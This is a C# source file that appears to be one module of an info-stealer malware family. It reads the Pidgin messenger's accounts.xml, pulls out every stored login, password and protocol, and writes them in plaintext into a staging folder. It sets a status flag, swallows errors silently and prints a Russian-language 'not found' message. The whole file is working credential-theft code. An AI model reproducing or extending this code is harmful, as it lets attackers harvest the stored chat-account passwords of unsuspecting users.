using System;
using System.IO;
using System.Xml;

internal class Pidgin
{
	public static void Start()
	{
		try
		{
			string text = $"{Buffer.path_l}Pidgin";
			string text2 = $"{Buffer.path_ad}.purple\\accounts.xml";
			if (!Directory.Exists(text))
			{
				Directory.CreateDirectory(text);
			}
			if (File.Exists(text2))
			{
				string text3 = "";
				XmlDocument xmlDocument = new XmlDocument();
				xmlDocument.Load(text2);
				foreach (XmlNode childNode in xmlDocument.DocumentElement.ChildNodes)
				{
					string innerText = childNode.ChildNodes[1].InnerText;
					string innerText2 = childNode.ChildNodes[2].InnerText;
					string innerText3 = childNode.ChildNodes[0].InnerText;
					if (!string.IsNullOrEmpty(innerText) && !string.IsNullOrEmpty(innerText2) && !string.IsNullOrEmpty(innerText3))
					{
						text3 += "=====================================\n";
						text3 = text3 + "Login: " + innerText + "\n";
						text3 = text3 + "Password: " + innerText2 + "\n";
						text3 = text3 + "Protocol: " + innerText3 + "\n";
						text3 += "=====================================\n\n\n";
					}
				}
				Buffer.XBufferData[17] = "1";
				File.WriteAllText($"{text}\\Pidgin.txt", text3.Trim().Replace("\n", Environment.NewLine));
			}
			else
			{
				File.WriteAllText($"{text}\\info.txt", $"{Buffer.head}Pidgin не найден на компьютере.");
			}
		}
		catch
		{
		}
		Buffer.XBufferData[17] = "0";
	}
}
